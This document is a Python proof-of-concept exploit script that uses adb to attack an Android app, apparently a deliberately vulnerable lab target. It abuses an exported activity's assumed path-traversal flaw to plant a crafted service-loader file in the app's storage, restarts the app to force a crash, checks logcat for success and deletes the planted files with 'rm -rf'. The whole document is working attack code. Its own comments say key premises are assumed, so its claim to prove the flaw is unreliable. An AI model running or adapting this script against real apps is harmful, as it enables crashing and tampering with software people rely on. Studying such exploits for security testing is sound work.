```python
import subprocess
import time
import re
import threading
import os

# --- Configuration ---
PACKAGE_NAME = "com.app.VulnerAppDLH"
INSECURE_FILE_ACTIVITY = f"{PACKAGE_NAME}/.InsecureFileActivity"
# Assuming there is a main activity to start the app and trigger service loading
MAIN_ACTIVITY = f"{PACKAGE_NAME}/.MainActivity"

# The path to the service file within the app's 'files' directory
# This leverages the assumed path traversal vulnerability in InsecureFileActivity
# to create the META-INF/services/ directory structure.
MALICIOUS_SERVICE_FILE_PATH_TRAVERSAL = "META-INF/services/kotlinx.coroutines.internal.MainDispatcherFactory"
# Content of the service file: a class name that does not exist in the APK.
# This will cause ClassNotFoundException during loading, leading to an IllegalArgumentException crash
# in FastServiceLoader as per the vulnerability description.
MALICIOUS_SERVICE_FILE_CONTENT = "com.attacker.NonExistentClass"

# Success indicator in logcat (IllegalArgumentException from FastServiceLoader)
SUCCESS_INDICATOR_CRASH = "java.lang.IllegalArgumentException: No providers were loaded with FastServiceLoader"

# --- Logcat monitoring setup ---
logcat_output = []
logcat_process = None
stop_logcat_event = threading.Event()

def monitor_logcat():
    """Monitors adb logcat output for the target package."""
    global logcat_process
    print("[*] Starting adb logcat monitor...")
    # Clear existing logcat buffer
    subprocess.run(["adb", "logcat", "-c"], capture_output=True, text=True)
    # Start logcat process, filtering for the target package
    logcat_process = subprocess.Popen(
        ["adb", "logcat", "-s", "System.err:*", "-e", PACKAGE_NAME], # Filter for System.err and package
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8"
    )
    try:
        for line in iter(logcat_process.stdout.readline, ''):
            if stop_logcat_event.is_set():
                break
            logcat_output.append(line.strip())
    except Exception as e:
        print(f"[-] Error in logcat thread: {e}")
    finally:
        if logcat_process and logcat_process.poll() is None:
            logcat_process.terminate()
            logcat_process.wait(timeout=5) # Ensure process terminates
        print("[*] Logcat monitor stopped.")

def start_logcat_monitor():
    """Initializes and starts the logcat monitoring thread."""
    stop_logcat_event.clear()
    thread = threading.Thread(target=monitor_logcat)
    thread.daemon = True  # Allows the main program to exit even if thread is running
    thread.start()
    time.sleep(1)  # Give the logcat process a moment to start

def stop_logcat_monitor():
    """Signals the logcat monitoring thread to stop and cleans up."""
    stop_logcat_event.set()
    if logcat_process and logcat_process.poll() is None:
        logcat_process.terminate()
        logcat_process.wait(timeout=5)

def check_for_success(indicator):
    """Checks the captured logcat output for the specified success indicator."""
    print(f"[*] Checking logcat for success indicator: '{indicator}'")
    for line in logcat_output:
        if indicator in line:
            return True
    return False

def run_adb_command(command, check_return=True):
    """Executes an ADB command and prints its output."""
    print(f"[*] Running ADB command: {' '.join(command)}")
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=check_return, encoding="utf-8")
        if result.stdout:
            print(f"   STDOUT: {result.stdout.strip()}")
        if result.stderr:
            print(f"   STDERR: {result.stderr.strip()}")
        return result
    except subprocess.CalledProcessError as e:
        print(f"[-] ADB command failed (return code {e.returncode}): {e.stderr.strip()}")
        raise
    except FileNotFoundError:
        print("[-] Error: 'adb' command not found. Please ensure ADB is installed and in your PATH.")
        exit(1)


def main():
    print(f"[+] PoC for FastServiceLoader vulnerability in {PACKAGE_NAME}")

    start_logcat_monitor()

    try:
        # Step 1: Force-stop the app to ensure a clean state and prepare for service loading on restart.
        # This clears memory and ensures the FastServiceLoader is initialized when the app starts again.
        print(f"[*] Force-stopping {PACKAGE_NAME}...")
        run_adb_command(["adb", "shell", "am", "force-stop", PACKAGE_NAME])
        time.sleep(2) # Give the system time to terminate the app

        # Step 2: Exploit InsecureFileActivity to write the malicious service file.
        # We assume InsecureFileActivity is exported and vulnerable to path traversal,
        # allowing creation of arbitrary files/directories within the app's internal storage
        # (e.g., /data/data/PACKAGE_NAME/files/).
        # The 'filepath' extra is treated as relative to the app's base file directory,
        # and allows creation of nested directories like META-INF/services/.
        print(f"[*] Attempting to write malicious service file via InsecureFileActivity...")
        write_command = [
            "adb", "shell", "am", "start", "-n", INSECURE_FILE_ACTIVITY,
            "--es", "filepath", MALICIOUS_SERVICE_FILE_PATH_TRAVERSAL,
            "--es", "filecontent", MALICIOUS_SERVICE_FILE_CONTENT
        ]
        run_adb_command(write_command)
        time.sleep(3) # Give the activity time to process the file write

        # Step 3: Trigger FastServiceLoader by restarting the application.
        # When the app restarts, it will likely re-initialize coroutines, which uses FastServiceLoader
        # to find and instantiate MainDispatcherFactory services from its classpath.
        # Our injected file should now be on the classpath (if 'files' dir is scanned by ClassLoader).
        print(f"[*] Restarting {PACKAGE_NAME} to trigger FastServiceLoader...")
        run_adb_command(["adb", "shell", "am", "start", "-n", MAIN_ACTIVITY])
        time.sleep(5) # Give the app time to start and execute service loading logic

        # Step 4: Verify the vulnerability using logcat.
        # We expect a crash (IllegalArgumentException) because FastServiceLoader will try
        # to instantiate 'com.attacker.NonExistentClass', fail, and then throw the exception
        # indicating "No providers were loaded".
        if check_for_success(SUCCESS_INDICATOR_CRASH):
            print(f"\n[+] SUCCESS: Detected crash '{SUCCESS_INDICATOR_CRASH}' in logcat!")
            print("[+] The FastServiceLoader successfully loaded the crafted service file and attempted to instantiate a non-existent class, leading to a demonstrable crash.")
            print("[+] This proves an attacker can influence class loading behavior by injecting files onto the classpath via path traversal.")
        else:
            print(f"\n[-] FAILED: Did not detect the expected crash '{SUCCESS_INDICATOR_CRASH}' in logcat.")
            print("[-] This might indicate that:")
            print("    - The InsecureFileActivity did not successfully write the malicious file to a classpath-accessible location.")
            print("    - The FastServiceLoader was not triggered, or did not attempt to load services from the injected path.")
            print("    - The app did not crash as expected for other reasons.")

    except Exception as e:
        print(f"[-] An unexpected error occurred during PoC execution: {e}")
    finally:
        stop_logcat_monitor()
        # Optional cleanup: Attempt to remove the injected META-INF directory
        print("\n[*] Attempting to clean up injected files (may not succeed if app crashed or permissions issues).")
        run_adb_command(["adb", "shell", f"rm -rf /data/data/{PACKAGE_NAME}/files/META-INF"], check_return=False)
        run_adb_command(["adb", "shell", "am", "force-stop", PACKAGE_NAME], check_return=False)
        print("[*] PoC execution finished.")

if __name__ == "__main__":
    main()
```